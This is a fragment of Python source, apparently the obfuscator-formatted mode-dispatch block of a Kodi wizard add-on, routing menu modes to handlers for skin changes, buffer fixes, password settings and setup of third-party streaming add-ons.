elif mode =='bg':wiz .bg_install (name ,url )#line:5533
elif mode =='bgcustom':wiz .bg_custom ()#line:5534
elif mode =='bgremove':wiz .bg_remove ()#line:5535
elif mode =='bgdefault':wiz .bg_default ()#line:5536
elif mode =='rdset':rdsetup ()#line:5537
elif mode =='mor':morsetup ()#line:5538
elif mode =='mor2':morsetup2 ()#line:5539
elif mode =='resolveurl':resolveurlsetup ()#line:5540
elif mode =='urlresolver':urlresolversetup ()#line:5541
elif mode =='forcefastupdate':forcefastupdate ()#line:5542
elif mode =='traktset':traktsetup ()#line:5543
elif mode =='placentaset':placentasetup ()#line:5544
elif mode =='flixnetset':flixnetsetup ()#line:5545
elif mode =='reptiliaset':reptiliasetup ()#line:5546
elif mode =='yodasset':yodasetup ()#line:5547
elif mode =='numbersset':numberssetup ()#line:5548
elif mode =='uranusset':uranussetup ()#line:5549
elif mode =='genesisset':genesissetup ()#line:5550
elif mode =='fastupdate':fastupdate ()#line:5551
elif mode =='folderback':folderback ()#line:5552
elif mode =='menudata':Menu ()#line:5553
elif mode ==2 :#line:5555
        wiz .torent_menu ()#line:5556
elif mode ==3 :#line:5557
        wiz .popcorn_menu ()#line:5558
elif mode ==8 :#line:5559
        wiz .metaliq_fix ()#line:5560
elif mode ==9 :#line:5561
        wiz .quasar_menu ()#line:5562
elif mode ==5 :#line:5563
        swapSkins ('skin.Premium.mod')#line:5564
elif mode ==13 :#line:5565
        wiz .elementum_menu ()#line:5566
elif mode ==16 :#line:5567
        wiz .fix_wizard ()#line:5568
elif mode ==17 :#line:5569
        wiz .last_play ()#line:5570
elif mode ==18 :#line:5571
        wiz .normal_metalliq ()#line:5572
elif mode ==19 :#line:5573
        wiz .fast_metalliq ()#line:5574
elif mode ==20 :#line:5575
        wiz .fix_buffer2 ()#line:5576
elif mode ==21 :#line:5577
        wiz .fix_buffer3 ()#line:5578
elif mode ==11 :#line:5579
        wiz .fix_buffer ()#line:5580
elif mode ==15 :#line:5581
        wiz .fix_font ()#line:5582
elif mode ==14 :#line:5583
        wiz .clean_pass ()#line:5584
elif mode ==22 :#line:5585
        wiz .movie_update ()#line:5586
elif mode =='adv_settings':buffer1 ()#line:5587
elif mode =='getpass':getpass ()#line:5588
elif mode =='setpass':setpass ()#line:5589
elif mode =='setuname':setuname ()#line:5590
elif mode =='passandUsername':passandUsername ()#line:5591
elif mode =='9':disply_hwr ()#line:5592
elif mode =='99':disply_hwr2 ()#line:5593
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))